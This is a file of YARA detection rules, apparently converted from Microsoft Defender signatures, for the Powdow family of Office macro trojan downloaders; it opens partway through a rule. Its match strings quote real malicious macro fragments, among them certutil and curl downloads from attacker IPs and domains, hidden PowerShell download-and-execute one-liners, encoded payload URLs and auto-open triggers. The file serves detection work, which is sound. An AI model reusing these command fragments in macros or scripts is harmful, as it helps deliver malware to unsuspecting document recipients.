        $x_1_2 = "XNFjhL.Run \"certutil.exe -urlcache -split -f \" + ebqrn + \" \" + yOshiC" ascii //weight: 1
        $x_1_3 = "Auto_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCH_2147832241_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCH!MTB"
        threat_id = "2147832241"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd/ccertutil.exe-urlcache-split-f\"\"http://\"&u&\"/tq/loader/uploads/product_details_018_rfq.exe\"\"zcldxvqciopgykje.exe.exe" ascii //weight: 1
        $x_1_2 = "shell(cc,vbhide)nextuendsub" ascii //weight: 1
        $x_1_3 = "workbook_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCH_2147832241_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCH!MTB"
        threat_id = "2147832241"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "workbook_open()calldownloadexefileandexecutesilent" ascii //weight: 1
        $x_1_2 = "environ(\"temp\")strfilepath=struserfolder&\"\\\"&chrw(112)&chrw(112)&chrw(46)&chrw(101)&chrw(120)&chrw(101)" ascii //weight: 1
        $x_1_3 = "shell(command,vbnormalfocus)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDOH_2147832357_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDOH!MTB"
        threat_id = "2147832357"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 73 68 65 6c 6c 28 22 63 6d 64 2f 63 63 65 72 74 75 74 69 6c 2e 65 78 65 2d 75 72 6c 63 61 63 68 65 2d 73 70 6c 69 74 2d 66 22 22 68 74 74 70 3a 2f 2f 34 35 2e 31 35 35 2e 31 36 35 2e 36 33 2f [0-3] 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f [0-37] 2e 65 78 65 22 22 [0-31] 2e 65 78 65 2e 65 78 65 26 26 02 2e 65 78 65 2e 65 78 65 22 2c 76 62 68 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DPA_2147832663_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DPA!MTB"
        threat_id = "2147832663"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "-split-f\"+ccuhyzsmghk+\"\"+zblowerl,0,true" ascii //weight: 1
        $x_1_2 = "=xxwr8(\"exe.bfuytwbyu6cxshl/mer/moc.nrutqet//:sptth\")" ascii //weight: 1
        $x_1_3 = "wr8&mid(xxwr9,ceny0,1)lfo" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DPB_2147832664_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DPB!MTB"
        threat_id = "2147832664"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=rpxguwr8(\"exe.ujj2f41df1f50ae/nilbog/moc.nrutqet//:sptth\")" ascii //weight: 1
        $x_1_2 = "-split-f\"+tpql+\"\"+cvcjb,0,true" ascii //weight: 1
        $x_1_3 = "forauea0=len(rpxguwr9)to1step-1zoswzqbtkpbskdr=" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DPE_2147833030_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DPE!MTB"
        threat_id = "2147833030"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "subauto_open()=\"c:~~users~~\"&environ(\"username\")&\"~~$$ppd$$t$$~~ro$$ming~~microsoft~~windows~~st$$rtmenu~~progr$$ms~~st$$rtup~~upd$$te!!\"::" ascii //weight: 1
        $x_1_2 = ":=vba.replace(,\"!!\",\".js\"):::::=vba.replace(,\"$$\",\"a\"):::::=" ascii //weight: 1
        $x_1_3 = "!![]);\"debug.print:::closedebug.printopenforoutputas#1debug.printopenforoutputas#2debug.printprint#1,+1+2+3debug.printprint#2,+1+2+3close=" ascii //weight: 1
        $x_1_4 = "):::::=vba.replace(,\"~~\",\"jscript\")debug.printcallshell!()debug.printendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCI_2147833207_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCI!MTB"
        threat_id = "2147833207"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell-e$c;\",vbhide)application.screenupdating=trueendsub" ascii //weight: 1
        $x_1_2 = "9icdodhrwoi8vbw9ub3bvbglhznjvbxlvds5yds9kb3dubg9hzc8ylmv4zs" ascii //weight: 1
        $x_1_3 = "autoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCI_2147833207_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCI!MTB"
        threat_id = "2147833207"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "createobject(ganhvcucusmzqdl(\"57536372\")&ganhvcucusmzqdl(\"6970742e5368656c6c\")).runcmdline" ascii //weight: 1
        $x_1_2 = "\"687474703a2f2f3135392e3232332e31\")&ganhvcucusmzqdl(\"38392e3232312f7570646174652e657865\")" ascii //weight: 1
        $x_1_3 = "workbook_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCJ_2147833220_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCJ!MTB"
        threat_id = "2147833220"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".shellexecutebmvkdlfdjklfasfw,peoskawefgea,\"\",\"open\",0endsub" ascii //weight: 1
        $x_1_2 = "=replace(oeioiwaofsodaf,pwoekdsfw,\"\")" ascii //weight: 1
        $x_1_3 = "document_open()setieoalsdfasfefafawe=createobject(\"shell.application\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCJ_2147833220_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCJ!MTB"
        threat_id = "2147833220"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ahr0cdovlzq1ljg0ljaumtczl2rvd25sb2fkxziyl3nlcnzlci5legu" ascii //weight: 1
        $x_1_2 = "ahr0cdovlze4ns4xntyunziunzgvmi5legunoyakuhr" ascii //weight: 1
        $x_1_3 = "ahr0cdovlzk0ljizmi4yndkumtyxl3vwzgf0ys9zdmmxlmv4zs" ascii //weight: 1
        $x_5_4 = "powershell-e$c;\"program=shell(cmdstr,vbhide)application.screenupdating=trueendsub" ascii //weight: 5
        $x_5_5 = "autoopen()" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_5_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_STL_2147833290_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STL!MTB"
        threat_id = "2147833290"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Start the shelled application:" ascii //weight: 1
        $x_1_2 = {43 72 65 61 74 65 50 72 6f 63 65 73 73 41 28 30 26 2c 20 43 68 72 28 31 31 32 29 20 2b 20 22 6f 77 65 72 22 20 2b 20 22 73 68 65 6c 6c 2e 65 78 65 20 22 20 2b 20 43 68 72 28 31 35 30 29 20 2b 20 22 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 22 20 2b 20 22 20 20 49 45 58 20 28 4e 65 77 2d 4f 62 6a 65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 53 74 72 69 6e 67 28 27 68 74 74 70 73 3a 2f 2f 66 69 6c 65 62 69 6e 2e 6e 65 74 2f [0-47] 2f [0-9] 2e 70 73 31 27 29 22 2c 20 30 26 2c 20 30 26 2c 20 31 26 2c 20 4e 4f 52 4d 41 4c 5f 50 52 49 4f 52 49 54 59 5f 43 4c 41 53 53 2c 20 30 26 2c 20 30 26 2c 20 73 74 61 72 74 2c 20 70 72 6f 63 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Loop Until ReturnValue <> 258" ascii //weight: 1
        $x_1_4 = "MsgBox \"Click Okay To Read File\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCL_2147833813_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCL!MTB"
        threat_id = "2147833813"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd/cstart/minpo\"car2=\"wershell-exby\"car3=\"pass-nop-wh;i'e'x(iw\"car4=\"r('https://" ascii //weight: 1
        $x_1_2 = "/fc8f19b2f68e09b09f1c69af066ffd6fe2cd20ca/files/black-start.txt')-useb);start-sleep" ascii //weight: 1
        $x_1_3 = "shelli_nameendfunction" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCL_2147833813_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCL!MTB"
        threat_id = "2147833813"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "subauto_open()callxcguxlvfendsubsubxcguxlvf()dimcasstringc=\"powershell.exe-nop-whidden-encjabxagkabgazadiaiaa9acaaqaaiaa0a" ascii //weight: 1
        $x_1_2 = "aggadab0ahaacwa6ac8alw\"_&\"axadkanaauadeaoaayac4amqa2adqalgaxadqaoqa6adgamaa4adaalwbmag8abgb0ageadwblahmabwbtagualgb3ag8azgbmaciakqa" ascii //weight: 1
        $x_1_3 = "\"shell(c)endsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DPG_2147833891_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DPG!MTB"
        threat_id = "2147833891"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "subauto_close()dimmodesasnewclass2modes.hootiyazendsub" ascii //weight: 1
        $x_1_2 = "')-useb);start-sleep\"car5=\"-seconds3\"maviya1=car1+car2+car3+car4+\"\"+car5carinterface_name(maviya1)shelli_nameendfunction" ascii //weight: 1
        $x_1_3 = "i_name=nameendfunctionpublicfunctionhootiyaz()dimcar1," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DPH_2147834259_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DPH!MTB"
        threat_id = "2147834259"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c^u^rlhtt^p://188.34.187.110/1234.s4ytjqno^xs4ytjqno-o\"&hgmf" ascii //weight: 1
        $x_1_2 = "a_d_f,openurl\"&fp4fwutfs2n," ascii //weight: 1
        $x_1_3 = "=replace(\"@or@iles\",\"@\",\"f\")reco.s" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STM_2147834352_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STM!MTB"
        threat_id = "2147834352"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "rockbottom = \"naakslookD5\"" ascii //weight: 1
        $x_1_2 = {67 6f 64 6b 6e 6f 77 73 20 3d 20 52 65 70 6c 61 63 65 28 22 63 6d 64 20 2f 63 20 70 6f 77 5e [0-15] 5e [0-15] 2f 57 20 30 31 20 63 5e 75 5e 72 6c 20 68 74 74 5e 70 3a 2f 2f 31 38 38 2e 33 34 2e 31 38 37 2e 31 31 30 2f 31 32 33 34 [0-6] 2e [0-15] 5e [0-15] 20 2d 6f 20 22 20 26 20 [0-6] 20 26 20 22 3b 22 20 26 20 [0-6] 2c 20 22 [0-15] 22 2c 20 22 65 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {6e 65 62 62 62 20 3d 20 52 65 70 6c 61 63 65 28 22 72 75 6e 64 7a 5f 61 5f 64 5f 66 7a 5f 61 5f 64 5f 66 33 32 20 75 72 7a 5f 61 5f 64 5f 66 2e 64 7a 5f 61 5f 64 5f 66 7a 5f 61 5f 64 5f 66 2c 4f 70 65 6e 55 52 4c 20 22 20 26 20 [0-31] 2c 20 22 7a 5f 61 5f 64 5f 66 22 2c 20 22 6c 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Reco.TargetPath = Replace(\"@Or@iLeS\", \"@\", \"f\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DPJ_2147834377_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DPJ!MTB"
        threat_id = "2147834377"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "+\"('https://plazaboulevard.com.br/dog.pdf')-\"+\"u\"+\"s\"+\"?\"+\"b\"+" ascii //weight: 1
        $x_1_2 = {61 75 74 6f 5f 63 6c 6f 73 65 28 29 6d 73 67 62 6f 78 22 65 72 72 6f 72 21 22 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a 3a [0-32] 3a 63 61 6c 6c 73 68 65 6c 6c 23 28 2c 30 29 65 6e 64 73 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STN_2147834486_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STN!MTB"
        threat_id = "2147834486"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "johntherock = \"afD5-sh7h7au9sfd\"" ascii //weight: 1
        $x_1_2 = "rickthedi = \"d8sasaD70A-43d8sasaB-d8sasaA42-9d8sasa4\"" ascii //weight: 1
        $x_1_3 = "du4i = edzxfvyq & \"lic\\784561233498465132.exe\"" ascii //weight: 1
        $x_1_4 = "godknows = Replace(\"cmd /c pow^edzxfvyqrs^hedzxfvyqll/W 01 c^u^rl htt^p://116.202.12.69/aaa.edzxfvyq^xedzxfvyq -o \" & du4i & \";\" & du4i, \"edzxfvyq\", \"e\")" ascii //weight: 1
        $x_1_5 = "uvhgso.exec godknows" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STO_2147835173_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STO!MTB"
        threat_id = "2147835173"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 33 37 2e 31 33 39 2e 31 32 38 2e 39 34 2f [0-4] 2f 44 6f 63 [0-31] 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DPK_2147835290_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DPK!MTB"
        threat_id = "2147835290"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 73 68 65 6c 6c 28 22 63 6d 64 2f 63 63 65 72 74 75 74 69 6c 2e 65 78 65 2d 75 72 6c 63 61 63 68 65 2d 73 70 6c 69 74 2d 66 22 22 68 74 74 70 3a 2f 2f 31 38 35 2e 32 34 36 2e 32 32 30 2e 36 35 2f [0-3] 2f [0-15] 2e 65 78 65 22 22 [0-31] 2e 65 78 65 2e 65 78 65 26 26 02 2e 65 78 65 2e 65 78 65 22 2c 76 62 68 69 64 65 29 65 6e 64 73 75}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 73 68 65 6c 6c 28 22 63 6d 64 2f 63 63 65 72 74 75 74 69 6c 2e 65 78 65 2d 75 72 6c 63 61 63 68 65 2d 73 70 6c 69 74 2d 66 22 22 68 74 74 70 3a 2f 2f 69 6e 73 74 72 75 69 6e 67 65 6e 69 65 72 69 61 2e 63 6f 6d 2f 70 72 6f 63 65 73 73 65 64 69 6e 76 6f 69 63 65 63 6f 70 79 2e 65 78 65 22 22 [0-31] 2e 65 78 65 2e 65 78 65 26 26 00 2e 65 78 65 2e 65 78 65 22 2c 76 62 68 69 64 65 29 65 6e 64 73 75}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_JJT_2147835379_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.JJT!MTB"
        threat_id = "2147835379"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://211.252.131.224/2022/mal/4qmal.gif" ascii //weight: 1
        $x_1_2 = "= VBA.CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_3 = "= \"/c \" & \"rename \" & \"C:\\Temp\\4qmal.gif 4qmal_c2.exe" ascii //weight: 1
        $x_1_4 = "Shell (\"C:\\Temp\\4qmal_c2.\" & \"e\" & \"xe\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_JFT_2147835380_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.JFT!MTB"
        threat_id = "2147835380"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "URL = \"http://192.119.71.89/purchase_list.txt" ascii //weight: 1
        $x_1_2 = "= \"C:\\Users\\\" & Environ(\"UserName\") & \"\\downloads\\purchase_list.txt" ascii //weight: 1
        $x_1_3 = "Shell (\"C:\\Users\\\" & Environ(\"UserName\") & \"\\downloads\\purchase_list.exe -e cmd.exe\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STP_2147835419_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STP!MTB"
        threat_id = "2147835419"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 39 32 2e 33 2e 31 39 34 2e 32 34 36 2f [0-9] 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STQ_2147836376_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STQ!MTB"
        threat_id = "2147836376"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rickthedi = \"d8sasaD70A-43d8sasaB-d8sasaA42-9d8sasa4\"" ascii //weight: 1
        $x_1_2 = "sy9cquuw = usa & \"sers\\Pub\"" ascii //weight: 1
        $x_1_3 = "jktl = sy9cquuw & \"lic\\fdjk483u9rey89t53e.exe\"" ascii //weight: 1
        $x_1_4 = "godknows = Replace(\"cmd /c pow^sy9cquuwrs^hsy9cquuwll/W 01 c^u^rl htt^ps://transfsy9cquuwr.sh/gsy9cquuwt/JQJU3c/fdrssy9cquuwtrgh.sy9cquuw^xsy9cquuw -o \" & jktl & \";\" & jktl, \"sy9cquuw\", \"e\")" ascii //weight: 1
        $x_1_5 = "doagyi.exec godknows" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBO_2147836471_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBO!MTB"
        threat_id = "2147836471"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ttp://67.210.114.99/a.exe\"filepath=cstr(environ(\"appdata\")" ascii //weight: 1
        $x_1_2 = "urldownloadtofile(0,url,filepath,0,0)ifresult=0thenshell\"shutdown-r-t02\"" ascii //weight: 1
        $x_1_3 = "workbook_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_MJP_2147837116_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.MJP!MTB"
        threat_id = "2147837116"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "kim + \"https://www.mediafire.com/file/h9srwdnp79d9t49/10.txt/file" ascii //weight: 1
        $x_1_2 = "') -useB) | .('{x}{9}'.replace('9','0').replace('x','1')-f'KIAISISA','*****').replace('*****','I').replace('KIAISISA','EX')" ascii //weight: 1
        $x_1_3 = "= \"^*w?rsh?>>\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

